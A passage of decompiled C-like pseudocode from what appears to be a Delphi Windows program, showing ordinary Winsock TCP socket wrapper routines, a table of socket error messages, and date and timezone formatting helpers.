// 40F96E: variable 'v1' is possibly undefined
// 40F973: variable 'v3' is possibly undefined

//----- (0040F998) --------------------------------------------------------
void __userpurge sub_40F998(int a1@<eax>, int a2@<edx>, char *a3@<ecx>, char *a4)
{
  char *v6; // ecx
  struct protoent *v7; // esi
  struct servent *v8; // eax
  char *v9; // eax
  u_short v10; // ax
  char v11; // zf
  char *v12; // edi
  unsigned int v13; // eax
  struct hostent *v14; // eax
  LStr *v15; // ecx
  LStr *v16; // ecx
  const char *v17; // [esp-10h] [ebp-20h]
  unsigned int v18[2]; // [esp-Ch] [ebp-1Ch] BYREF
  LStr *v19; // [esp-4h] [ebp-14h]
  char *v20; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v20 = a3;
  sub_4038D8((int)a3);
  sub_4038D8((int)a4);
  v19 = (LStr *)&savedregs;
  v18[1] = (unsigned int)&loc_40FA7D;
  v18[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v18);
  sub_4028D4((char *)a2, 16, 0);
  *(_WORD *)a2 = 2;
  v7 = getprotobynumber(*(_DWORD *)(a1 + 44));
  v8 = 0;
  if ( v7 )
  {
    v17 = v7->p_name;
    v9 = sub_4038E8(a4);
    v8 = getservbyname(v9, v17);
  }
  if ( v8 )
  {
    *(_WORD *)(a2 + 2) = v8->s_port;
  }
  else
  {
    v10 = sub_407058((int)a4, 0, v6);
    *(_WORD *)(a2 + 2) = htons(v10);
  }
  System::__linkproc__ LStrCmp(v6, "255.255.255.255");
  if ( v11 )
  {
    *(_DWORD *)(a2 + 4) = -1;
  }
  else
  {
    v12 = sub_4038E8(v20);
    v13 = inet_addr(v12);
    *(_DWORD *)(a2 + 4) = v13;
    if ( v13 == -1 )
    {
      v14 = gethostbyname(v12);
      if ( v14 )
        *(_DWORD *)(a2 + 4) = **(_DWORD **)v14->h_addr_list;
    }
  }
  v15 = v19;
  __writefsdword(0, v18[0]);
  v19 = (LStr *)&loc_40FA84;
  System::__linkproc__ LStrClr(v15);
  System::__linkproc__ LStrClr(v16);
}
// 40FA02: variable 'v6' is possibly undefined
// 40FA28: variable 'v11' is possibly undefined
// 40FA77: variable 'v16' is possibly undefined

//----- (0040FAA4) --------------------------------------------------------
void __usercall sub_40FAA4(int a1@<eax>, int a2@<ecx>)
{
  if ( *(_DWORD *)(a1 + 4) == -1 )
    *(_DWORD *)(a1 + 40) = WSAGetLastError();
  else
    *(_DWORD *)(a1 + 40) = 0;
  sub_40FF9C(a1, a2);
}
// 40FABE: variable 'a2' is possibly undefined

//----- (0040FAC8) --------------------------------------------------------
int __usercall sub_40FAC8@<eax>(int a1@<eax>)
{
  return closesocket(*(_DWORD *)(a1 + 4));
}

//----- (0040FAD4) --------------------------------------------------------
void __usercall sub_40FAD4(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>)
{
  int v4; // eax
  int v5; // ecx
  LStr *v6; // ecx
  unsigned int v7[2]; // [esp-Ch] [ebp-28h] BYREF
  LStr *v8; // [esp-4h] [ebp-20h]
  struct sockaddr name; // [esp+4h] [ebp-18h] BYREF
  char *v10; // [esp+14h] [ebp-8h]
  char *v11; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v10 = a3;
  v11 = a2;
  sub_4038D8((int)a2);
  sub_4038D8((int)v10);
  v8 = (LStr *)&savedregs;
  v7[1] = (unsigned int)&loc_40FB53;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_40F998(a1, (int)&name, v11, v10);
  v4 = connect(*(_DWORD *)(a1 + 4), &name, 16);
  sub_40FF88(a1, v4);
  sub_40FB60(a1);
  sub_40FF9C(a1, v5);
  v6 = v8;
  __writefsdword(0, v7[0]);
  v8 = (LStr *)&loc_40FB5A;
  System::__linkproc__ LStrArrayClr(v6, 2);
}
// 40FB33: variable 'v5' is possibly undefined

//----- (0040FB60) --------------------------------------------------------
int __usercall sub_40FB60@<eax>(int a1@<eax>)
{
  int v3[2]; // [esp+0h] [ebp-8h] BYREF

  v3[0] = 16;
  getsockname(*(_DWORD *)(a1 + 4), (struct sockaddr *)(a1 + 8), v3);
  v3[0] = 16;
  return getpeername(*(_DWORD *)(a1 + 4), (struct sockaddr *)(a1 + 24), v3);
}

//----- (0040FB94) --------------------------------------------------------
int __usercall sub_40FB94@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>)
{
  int v4; // esi
  int v5; // ecx

  v4 = send(*(_DWORD *)(a3 + 4), buf, len, 0);
  sub_40FF88(a3, v4);
  sub_40FF9C(a3, v5);
  return v4;
}
// 40FBB2: variable 'v5' is possibly undefined

//----- (0040FBBC) --------------------------------------------------------
int __usercall sub_40FBBC@<eax>(int a1@<eax>, char a2@<dl>)
{
  int v3; // eax
  int v4; // ecx
  int result; // eax
  char buf[8]; // [esp+0h] [ebp-8h] BYREF

  buf[0] = a2;
  v3 = send(*(_DWORD *)(a1 + 4), buf, 1, 0);
  sub_40FF88(a1, v3);
  sub_40FF9C(a1, v4);
  return result;
}
// 40FBE0: variable 'v4' is possibly undefined

//----- (0040FBE8) --------------------------------------------------------
void __usercall sub_40FBE8(int a1@<eax>, char *a2@<edx>)
{
  char *v3; // eax
  int v4; // eax
  int v5; // ecx
  LStr *v6; // ecx
  int v7; // [esp-14h] [ebp-1Ch]
  unsigned int v8[2]; // [esp-Ch] [ebp-14h] BYREF
  LStr *v9; // [esp-4h] [ebp-Ch]
  char *v10; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v10 = a2;
  sub_4038D8((int)a2);
  v9 = (LStr *)&savedregs;
  v8[1] = (unsigned int)&loc_40FC4B;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v7 = sub_403724((int)v10);
  v3 = sub_4038E8(v10);
  v4 = send(*(_DWORD *)(a1 + 4), v3, v7, 0);
  sub_40FF88(a1, v4);
  sub_40FF9C(a1, v5);
  v6 = v9;
  __writefsdword(0, v8[0]);
  v9 = (LStr *)&loc_40FC52;
  System::__linkproc__ LStrClr(v6);
}
// 40FC30: variable 'v5' is possibly undefined

//----- (0040FC58) --------------------------------------------------------
int __usercall sub_40FC58@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>)
{
  int v4; // eax
  int v5; // ecx
  int v6; // esi

  v4 = recv(*(_DWORD *)(a3 + 4), buf, len, 0);
  v6 = v4;
  if ( v4 )
    sub_40FF88(a3, v4);
  else
    *(_DWORD *)(a3 + 40) = 10057;
  sub_40FF9C(a3, v5);
  return v6;
}
// 40FC83: variable 'v5' is possibly undefined

//----- (0040FC90) --------------------------------------------------------
int __usercall sub_40FC90@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // ebx
  int v5; // ecx
  int v6; // eax
  int buf[4]; // [esp+0h] [ebp-10h] BYREF

  buf[0] = a3;
  LOBYTE(buf[0]) = 0;
  v4 = 0;
  if ( (unsigned __int8)sub_410100(a1, a2) )
  {
    v6 = recv(*(_DWORD *)(a1 + 4), (char *)buf, 1, 0);
    if ( v6 )
      sub_40FF88(a1, v6);
    else
      *(_DWORD *)(a1 + 40) = 10057;
    LOBYTE(v4) = buf[0];
  }
  else
  {
    *(_DWORD *)(a1 + 40) = 10060;
  }
  sub_40FF9C(a1, v5);
  return v4;
}
// 40FCE1: variable 'v5' is possibly undefined

//----- (0040FCF0) --------------------------------------------------------
void __usercall sub_40FCF0(int a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  LStr *v4; // ecx
  int v5; // esi
  int v6; // ebx
  int v7; // esi
  char v8; // bl
  int v9; // eax
  int v10; // ecx
  LStr *v11; // ecx
  LStr *v12; // ecx
  unsigned int v13[2]; // [esp-Ch] [ebp-438h] BYREF
  LStr *v14; // [esp-4h] [ebp-430h]
  BYTE *v15; // [esp+Ch] [ebp-420h] BYREF
  BYTE *v16; // [esp+10h] [ebp-41Ch] BYREF
  char *v17; // [esp+14h] [ebp-418h] BYREF
  char v18[1025]; // [esp+1Bh] [ebp-411h] BYREF
  char *buf; // [esp+41Ch] [ebp-10h]
  char *v20; // [esp+420h] [ebp-Ch] BYREF
  char **v21; // [esp+424h] [ebp-8h]
  int v22; // [esp+428h] [ebp-4h]
  int savedregs; // [esp+42Ch] [ebp+0h] BYREF

  v15 = 0;
  v16 = 0;
  v17 = 0;
  v20 = 0;
  v21 = a3;
  v22 = a2;
  v14 = (LStr *)&savedregs;
  v13[1] = (unsigned int)&loc_40FEDB;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  System::__linkproc__ LStrClr((LStr *)a3);
  buf = v18;
  *(_DWORD *)(a1 + 40) = 0;
  while ( *(_DWORD *)(a1 + 48) )
  {
LABEL_14:
    v7 = __linkproc__ LStrPos((char)dword_40FEF4, *(char **)(a1 + 48));
    if ( v7 <= 0 )
      v7 = sub_403724(*(_DWORD *)(a1 + 48));
    __linkproc__ LStrCopy(*(char **)(a1 + 48), 1, v7 - 1, &v17);
    System::__linkproc__ LStrCat((BYTE **)&v20, v17);
    v8 = *(_BYTE *)(*(_DWORD *)(a1 + 48) + v7 - 1);
    System::__linkproc__ LStrDelete((char **)(a1 + 48), 1, v7);
    sub_403670(&v16);
    System::__linkproc__ LStrCat((BYTE **)&v20, (char *)v16);
    if ( v8 == 10 )
      goto LABEL_17;
  }
  v5 = sub_41005C(a1, (u_long)v4);
  if ( !v5 )
    v5 = 1;
  if ( v5 > 1024 )
    v5 = 1024;
  if ( v5 == 1 )
  {
    (*(void (**)(void))(*(_DWORD *)a1 + 20))();
    if ( *(_DWORD *)(a1 + 40) )
      goto LABEL_17;
    sub_403670((BYTE **)(a1 + 48));
    goto LABEL_14;
  }
  v6 = recv(*(_DWORD *)(a1 + 4), buf, v5, 0);
  sub_40FF88(a1, v6);
  if ( !v6 )
    *(_DWORD *)(a1 + 40) = 10057;
  if ( !*(_DWORD *)(a1 + 40) )
  {
    v18[v6] = 0;
    __linkproc__ LStrFromPChar_0((BYTE **)(a1 + 48), (BYTE *)buf);
    goto LABEL_14;
  }
LABEL_17:
  if ( *(_DWORD *)(a1 + 40) )
  {
    System::__linkproc__ LStrClr(v4);
  }
  else
  {
    Sysutils::AdjustLineBreaks((int)v20, &v15);
    __linkproc__ LStrLAsg(&v20, (char *)v15);
    v9 = __linkproc__ LStrPos((char)&dword_40FF00, v20);
    if ( v9 > 0 )
      __linkproc__ LStrCopy(v20, 1, v9 - 1, &v20);
    __linkproc__ LStrAsg(v21, v20);
  }
  sub_40FF9C(a1, v10);
  v11 = v14;
  __writefsdword(0, v13[0]);
  v14 = (LStr *)&loc_40FEE2;
  System::__linkproc__ LStrArrayClr(v11, 3);
  System::__linkproc__ LStrClr(v12);
}
// 40FD4D: variable 'v4' is possibly undefined
// 40FEB0: variable 'v10' is possibly undefined
// 40FED5: variable 'v12' is possibly undefined
// 40FEF4: using guessed type int dword_40FEF4[3];
// 40FF00: using guessed type int dword_40FF00;

//----- (0040FF04) --------------------------------------------------------
int __usercall sub_40FF04@<eax>(int len@<ecx>, char *buf@<edx>, int a3@<eax>)
{
  int v4; // esi
  int v5; // ecx

  v4 = recv(*(_DWORD *)(a3 + 4), buf, len, 2);
  sub_40FF88(a3, v4);
  sub_40FF9C(a3, v5);
  return v4;
}
// 40FF22: variable 'v5' is possibly undefined

//----- (0040FF2C) --------------------------------------------------------
int __usercall sub_40FF2C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v4; // ebx
  int v5; // ecx
  int v6; // eax
  int buf[4]; // [esp+0h] [ebp-10h] BYREF

  buf[0] = a3;
  LOBYTE(buf[0]) = 0;
  v4 = 0;
  if ( (unsigned __int8)sub_410100(a1, a2) )
  {
    v6 = recv(*(_DWORD *)(a1 + 4), (char *)buf, 1, 2);
    if ( !v6 )
      *(_DWORD *)(a1 + 40) = 10057;
    sub_40FF88(a1, v6);
    LOBYTE(v4) = buf[0];
  }
  else
  {
    *(_DWORD *)(a1 + 40) = 10060;
  }
  sub_40FF9C(a1, v5);
  return v4;
}
// 40FF7B: variable 'v5' is possibly undefined

//----- (0040FF88) --------------------------------------------------------
int __usercall sub_40FF88@<eax>(int a1@<eax>, int a2@<edx>)
{
  int result; // eax

  if ( a2 == -1 )
    result = WSAGetLastError();
  else
    result = 0;
  *(_DWORD *)(a1 + 40) = result;
  return result;
}

//----- (0040FF9C) --------------------------------------------------------
void __usercall sub_40FF9C(int a1@<eax>, int a2@<ecx>)
{
  void *v3; // edx
  int v4; // eax
  LStr *v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v6; // [esp-Ch] [ebp-28h] BYREF
  DWORD v7; // [esp-8h] [ebp-24h]
  int *v8; // [esp-4h] [ebp-20h]
  const ULONG_PTR *v9; // [esp+0h] [ebp-1Ch]
  unsigned int v10; // [esp+4h] [ebp-18h]
  int v11; // [esp+8h] [ebp-14h]
  LStr *v12; // [esp+Ch] [ebp-10h]
  char *v13; // [esp+10h] [ebp-Ch]
  char v14; // [esp+14h] [ebp-8h]
  char *v15; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v15 = 0;
  v8 = &savedregs;
  v7 = (DWORD)&loc_41002B;
  v6 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v6);
  if ( *(_BYTE *)(a1 + 52) && *(_DWORD *)(a1 + 40) )
  {
    sub_4101AC(*(_DWORD *)(a1 + 40), &v15, a2);
    v11 = *(_DWORD *)(a1 + 40);
    LOBYTE(v12) = 0;
    v13 = v15;
    v14 = 11;
    LOBYTE(v3) = 1;
    Exception_CreateFmt(dword_40F7D8, v3, "TCP/IP socket error %d: %s");
    *(_DWORD *)(v4 + 12) = *(_DWORD *)(a1 + 40);
    __linkproc__ LStrAsg((char **)(v4 + 16), v15);
    sub_402F98((DWORD)v6, v7, (DWORD)v8, v9);
  }
  v5 = v12;
  __writefsdword(0, v10);
  v12 = (LStr *)&loc_410032;
  System::__linkproc__ LStrClr(v5);
}
// 40FFF6: variable 'v3' is possibly undefined
// 410000: variable 'v4' is possibly undefined
// 40F7D8: using guessed type int dword_40F7D8[2];

//----- (0041005C) --------------------------------------------------------
u_long __usercall sub_41005C@<eax>(int a1@<eax>, u_long a2@<ecx>)
{
  u_long v3; // [esp+0h] [ebp-4h] BYREF

  v3 = a2;
  ioctlsocket(*(_DWORD *)(a1 + 4), 1074030207, &v3);
  return v3;
}

//----- (00410074) --------------------------------------------------------
int __fastcall sub_410074(LStr *a1, BYTE **a2)
{
  struct hostent *v3; // ebx
  int result; // eax
  unsigned int v5[5]; // [esp-Ch] [ebp-114h] BYREF
  char name[256]; // [esp+8h] [ebp-100h] BYREF
  int savedregs; // [esp+108h] [ebp+0h] BYREF

  v5[2] = (unsigned int)&savedregs;
  v5[1] = (unsigned int)&loc_4100DF;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  System::__linkproc__ LStrClr(a1);
  gethostname(name, 255);
  if ( name )
  {
    v3 = gethostbyname(name);
    if ( v3 )
      __linkproc__ LStrFromPChar_0(a2, (BYTE *)v3->h_name);
  }
  if ( !*a2 )
    __linkproc__ LStrAsg((char **)a2, "127.0.0.1");
  result = 0;
  __writefsdword(0, v5[0]);
  return result;
}

//----- (00410100) --------------------------------------------------------
int __usercall sub_410100@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v3; // ebx
  const struct timeval *v4; // esi
  int v5; // esi
  int v6; // ecx
  int v8[2]; // [esp+0h] [ebp-118h] BYREF
  fd_set readfds; // [esp+8h] [ebp-110h] BYREF

  v8[1] = 1000 * (a2 % 1000);
  v3 = 1000;
  v8[0] = a2 / 1000;
  v4 = (const struct timeval *)v8;
  if ( a2 == -1 )
    v4 = 0;
  sub_40F6C4(&readfds);
  sub_40F6B4(*(_DWORD *)(a1 + 4), (int *)&readfds);
  v5 = select(0, &readfds, 0, 0, v4);
  sub_40FF88(a1, v5);
  if ( *(_DWORD *)(a1 + 40) )
    v5 = 0;
  LOBYTE(v3) = v5 > 0;
  sub_40FF9C(a1, v6);
  return v3;
}
// 410175: variable 'v6' is possibly undefined

//----- (00410188) --------------------------------------------------------
void __usercall sub_410188(int a1@<eax>)
{
  int v2; // ecx

  *(_DWORD *)(a1 + 4) = socket(2, 1, 6);
  *(_DWORD *)(a1 + 44) = 6;
  sub_40FAA4(a1, v2);
}
// 4101A2: variable 'v2' is possibly undefined

//----- (004101AC) --------------------------------------------------------
void __usercall sub_4101AC(int a1@<eax>, char **a2@<edx>, int a3@<ecx>)
{
  bool v4; // cf
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  LStr *v10; // ecx
  unsigned int v11[2]; // [esp-14h] [ebp-18h] BYREF
  LStr *v12; // [esp-Ch] [ebp-10h]
  int v13; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v13 = 0;
  v12 = (LStr *)&savedregs;
  v11[1] = (unsigned int)&loc_41074A;
  v11[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v11);
  if ( a1 > 10053 )
  {
    if ( a1 > 10066 )
    {
      if ( a1 > 10092 )
      {
        if ( a1 > 11002 )
        {
          v9 = a1 - 11003;
          if ( v9 )
          {
            if ( v9 != 1 )
              goto LABEL_83;
            __linkproc__ LStrAsg(a2, "Valid name, no data record of requested type");
          }
          else
          {
            __linkproc__ LStrAsg(a2, "Non recoverable error");
          }
        }
        else if ( a1 == 11002 )
        {
          __linkproc__ LStrAsg(a2, "Non authoritative - host not found");
        }
        else
        {
          v8 = a1 - 10093;
          if ( v8 )
          {
            if ( v8 != 908 )
              goto LABEL_83;
            __linkproc__ LStrAsg(a2, "Host not found");
          }
          else
          {
            __linkproc__ LStrAsg(a2, "Winsock not initialized");
          }
        }
      }
      else if ( a1 == 10092 )
      {
        __linkproc__ LStrAsg(a2, "Winsock DLL cannot support this application");
      }
      else
      {
        switch ( a1 )
        {
          case 10067:
            __linkproc__ LStrAsg(a2, "Too many processes");
            break;
          case 10068:
            __linkproc__ LStrAsg(a2, "Too many users");
            break;
          case 10069:
            __linkproc__ LStrAsg(a2, "Disk quota exceeded");
            break;
          case 10070:
            __linkproc__ LStrAsg(a2, "Stale NFS file handle");
            break;
          case 10071:
            __linkproc__ LStrAsg(a2, "Too many levels of remote in path");
            break;
          case 10091:
            __linkproc__ LStrAsg(a2, "Network subsystem is unusable");
            break;
          default:
            goto LABEL_83;
        }
      }
    }
    else if ( a1 == 10066 )
    {
      __linkproc__ LStrAsg(a2, "Directory is not empty");
    }
    else
    {
      switch ( a1 )
      {
        case 10054:
          __linkproc__ LStrAsg(a2, "Connection reset by peer");
          break;
        case 10055:
          __linkproc__ LStrAsg(a2, "No buffer space available");
          break;
        case 10056:
          __linkproc__ LStrAsg(a2, "Socket is already connected");
          break;
        case 10057:
          __linkproc__ LStrAsg(a2, "Socket is not connected");
          break;
        case 10058:
          __linkproc__ LStrAsg(a2, "Can't send after socket shutdown");
          break;
        case 10059:
          __linkproc__ LStrAsg(a2, "Too many references:can't splice");
          break;
        case 10060:
          __linkproc__ LStrAsg(a2, "Connection timed out");
          break;
        case 10061:
          __linkproc__ LStrAsg(a2, "Connection refused");
          break;
        case 10062:
          __linkproc__ LStrAsg(a2, "Too many levels of symbolic links");
          break;
        case 10063:
          __linkproc__ LStrAsg(a2, "File name is too long");
          break;
        case 10064:
          __linkproc__ LStrAsg(a2, "Host is down");
          break;
        case 10065:
          __linkproc__ LStrAsg(a2, "No route to host");
          break;
        default:
          goto LABEL_83;
      }
    }
  }
  else if ( a1 == 10053 )
  {
    __linkproc__ LStrAsg(a2, "Software caused connection abort");
  }
  else if ( a1 > 10040 )
  {
    switch ( a1 )
    {
      case 10041:
        __linkproc__ LStrAsg(a2, "Protocol wrong type for socket");
        break;
      case 10042:
        __linkproc__ LStrAsg(a2, "Protocol not available");
        break;
      case 10043:
        __linkproc__ LStrAsg(a2, "Protocol not supported");
        break;
      case 10044:
        __linkproc__ LStrAsg(a2, "Socket not supported");
        break;
      case 10045:
        __linkproc__ LStrAsg(a2, "Operation not supported on socket");
        break;
      case 10046:
        __linkproc__ LStrAsg(a2, "Protocol family not supported");
        break;
      case 10047:
        __linkproc__ LStrAsg(a2, "Address family not supported");
        break;
      case 10048:
        __linkproc__ LStrAsg(a2, "Address already in use");
        break;
      case 10049:
        __linkproc__ LStrAsg(a2, "Can't assign requested address");
        break;
      case 10050:
        __linkproc__ LStrAsg(a2, "Network is down");
        break;
      case 10051:
        __linkproc__ LStrAsg(a2, "Network is unreachable");
        break;
      case 10052:
        __linkproc__ LStrAsg(a2, "Network dropped connection on reset");
        break;
      default:
        goto LABEL_83;
    }
  }
  else if ( a1 == 10040 )
  {
    __linkproc__ LStrAsg(a2, "Message too long");
  }
  else if ( a1 > 10024 )
  {
    switch ( a1 )
    {
      case 10035:
        __linkproc__ LStrAsg(a2, "Operation would block");
        break;
      case 10036:
        __linkproc__ LStrAsg(a2, "Operation now in progress");
        break;
      case 10037:
        __linkproc__ LStrAsg(a2, "Operation already in progress");
        break;
      case 10038:
        __linkproc__ LStrAsg(a2, "Socket operation on nonsocket");
        break;
      case 10039:
        __linkproc__ LStrAsg(a2, "Destination address required");
        break;
      default:
        goto LABEL_83;
    }
  }
  else if ( a1 == 10024 )
  {
    __linkproc__ LStrAsg(a2, "Too many open files");
  }
  else if ( a1 > 10013 )
  {
    v7 = a1 - 10014;
    if ( v7 )
    {
      if ( v7 != 8 )
        goto LABEL_83;
      __linkproc__ LStrAsg(a2, "Invalid argument");
    }
    else
    {
      __linkproc__ LStrAsg(a2, "Bad address");
    }
  }
  else if ( a1 == 10013 )
  {
    __linkproc__ LStrAsg(a2, "Permission denied");
  }
  else
  {
    v4 = a1 == 0;
    v5 = a1 - 1;
    if ( v4 )
    {
      __linkproc__ LStrAsg(a2, (char *)dword_410760);
    }
    else
    {
      v6 = v5 - 10003;
      if ( v6 )
      {
        if ( v6 != 5 )
        {
LABEL_83:
          Sysutils::IntToStr(a3, (LStr *)&v13);
          System::__linkproc__ LStrCatN(a2, 3);
          goto LABEL_84;
        }
        __linkproc__ LStrAsg(a2, "Bad file number");
      }
      else
      {
        __linkproc__ LStrAsg(a2, "Interrupted system call");
      }
    }
  }
LABEL_84:
  v10 = v12;
  __writefsdword(0, v11[0]);
  v12 = (LStr *)&loc_410751;
  System::__linkproc__ LStrClr(v10);
}
// 410760: using guessed type int dword_410760[3];

//----- (00410E58) --------------------------------------------------------
int Finalization_0_7_9()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_410E7D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E65C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E65C: using guessed type int dword_41E65C;

//----- (00410E88) --------------------------------------------------------
void sub_410E88()
{
  --dword_41E65C;
}
// 41E65C: using guessed type int dword_41E65C;

//----- (00410EB4) --------------------------------------------------------
int Finalization_0_7_10()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_410ED9;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E660;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E660: using guessed type int dword_41E660;

//----- (00410EE4) --------------------------------------------------------
void sub_410EE4()
{
  --dword_41E660;
}
// 41E660: using guessed type int dword_41E660;

//----- (00410F04) --------------------------------------------------------
void __usercall sub_410F04(char **a1@<eax>)
{
  DWORD v2; // eax
  int v3; // ebx
  signed int v4; // eax
  LStr *v5; // ecx
  unsigned int v6[2]; // [esp-Ch] [ebp-D8h] BYREF
  LStr *v7; // [esp-4h] [ebp-D0h]
  int v8; // [esp+Ch] [ebp-C0h] BYREF
  char v9; // [esp+10h] [ebp-BCh]
  int v10; // [esp+14h] [ebp-B8h]
  char v11; // [esp+18h] [ebp-B4h]
  BYTE *v12; // [esp+1Ch] [ebp-B0h] BYREF
  struct _TIME_ZONE_INFORMATION TimeZoneInformation; // [esp+20h] [ebp-ACh] BYREF
  int savedregs; // [esp+CCh] [ebp+0h] BYREF

  v12 = 0;
  v7 = (LStr *)&savedregs;
  v6[1] = (unsigned int)&loc_410FF1;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  v2 = GetTimeZoneInformation(&TimeZoneInformation) - 1;
  if ( v2 )
  {
    if ( v2 == 1 )
      v3 = TimeZoneInformation.DaylightBias + TimeZoneInformation.Bias;
    else
      v3 = TimeZoneInformation.Bias;
  }
  else
  {
    v3 = TimeZoneInformation.StandardBias + TimeZoneInformation.Bias;
  }
  if ( v3 > 0 )
    __linkproc__ LStrAsg(a1, (char *)dword_411014);
  else
    __linkproc__ LStrAsg(a1, (char *)dword_411008);
  v4 = abs32(v3);
  v8 = v4 / 60;
  v9 = 0;
  v10 = v4 % 60;
  v11 = 0;
  sub_407B2C("%.2d%.2d", (int)&v8, 1, &v12);
  System::__linkproc__ LStrCat((BYTE **)a1, (char *)v12);
  v5 = v7;
  __writefsdword(0, v6[0]);
  v7 = (LStr *)&loc_410FF8;
  System::__linkproc__ LStrClr(v5);
}
// 411008: using guessed type int dword_411008[3];
// 411014: using guessed type int dword_411014[3];

//----- (00411110) --------------------------------------------------------
OLECHAR **__userpurge sub_411110@<eax>(char **a1@<eax>, int a2, int a3)
{
  char *v3; // ecx
  char v4; // zf
  int v5; // ebx
  char **v6; // esi
  char **v7; // edi
  int v8; // ebx
  char **v9; // esi
  char **v10; // edi
  int v11; // ebx
  char **v12; // esi
  char **v13; // edi
  int v14; // ebx
  char **v15; // esi
  char **v16; // edi
  LStr *v17; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *v19; // [esp-Ch] [ebp-74h] BYREF
  void *v20; // [esp-8h] [ebp-70h]
  int *v21; // [esp-4h] [ebp-6Ch]
  LStr *v22; // [esp+0h] [ebp-68h]
  char *v23; // [esp+Ch] [ebp-5Ch] BYREF
  OLECHAR *v24[12]; // [esp+10h] [ebp-58h] BYREF
  OLECHAR *v25[7]; // [esp+40h] [ebp-28h] BYREF
  char **v26; // [esp+5Ch] [ebp-Ch]
  char **v27; // [esp+60h] [ebp-8h]
  char **v28; // [esp+64h] [ebp-4h]
  int savedregs; // [esp+68h] [ebp+0h] BYREF

  v23 = 0;
  v28 = a1;
  System::__linkproc__ InitializeArray(v25, (char *)dword_401004, 7);
  System::__linkproc__ InitializeArray(v24, (char *)dword_401004, 12);
  v21 = &savedregs;
  v20 = &loc_4112A2;
  v19 = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&v19);
  System::__linkproc__ LStrCmp(v3, (char *)off_41D720);
  if ( v4 )
  {
    sub_408C8C((int)"ddd, d mmm yyyy hh:mm:ss", (int)v28, a2, a3);
  }
  else
  {
    v5 = 7;
    v6 = (char **)off_41DB38;
    v7 = (char **)v25;
    v27 = (char **)&off_41D720;
    do
    {
      __linkproc__ LStrAsg(v7, *v6);
      __linkproc__ LStrAsg(v6, *v27++);
      ++v7;
      ++v6;
      --v5;
    }
    while ( v5 );
    v8 = 12;
    v9 = (char **)off_41DB5C;
    v10 = (char **)v24;
    v26 = (char **)&off_41D73C;
    do
    {
      __linkproc__ LStrAsg(v10, *v9);
      __linkproc__ LStrAsg(v9, *v26++);
      ++v10;
      ++v9;
      --v8;
    }
    while ( v8 );
    sub_408C8C((int)"ddd, d mmm yyyy hh:mm:ss", (int)v28, a2, a3);
    v11 = 7;
    v12 = (char **)v25;
    v13 = (char **)off_41DB38;
    do
    {
      __linkproc__ LStrAsg(v13++, *v12++);
      --v11;
    }
    while ( v11 );
    v14 = 12;
    v15 = (char **)v24;
    v16 = (char **)off_41DB5C;
    do
    {
      __linkproc__ LStrAsg(v16++, *v15++);
      --v14;
    }
    while ( v14 );
  }
  sub_410F04(&v23);
  System::__linkproc__ LStrCatN(v28, 3);
  v17 = v22;
  __writefsdword(0, (unsigned int)v20);
  v22 = (LStr *)&loc_4112A9;
  System::__linkproc__ LStrClr(v17);
  System::__linkproc__ FinalizeArray(v24, (char *)dword_401004, 12);
  return System::__linkproc__ FinalizeArray(v25, (char *)dword_401004, 7);
}
// 411162: variable 'v3' is possibly undefined
// 411167: variable 'v4' is possibly undefined
// 401004: using guessed type int dword_401004[2];
// 41D720: using guessed type int (*off_41D720)[21];
// 41D73C: using guessed type int (*off_41D73C)[34];
// 41DB38: using guessed type void *off_41DB38;
// 41DB5C: using guessed type void *off_41DB5C;

//----- (004112E4) --------------------------------------------------------
void __usercall sub_4112E4(char *a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  int v4; // eax
  LStr *v5; // ecx
  unsigned int v6[2]; // [esp-Ch] [ebp-20h] BYREF
  LStr *v7; // [esp-4h] [ebp-18h]
  char *v8; // [esp+8h] [ebp-Ch] BYREF
  int v9; // [esp+Ch] [ebp-8h]
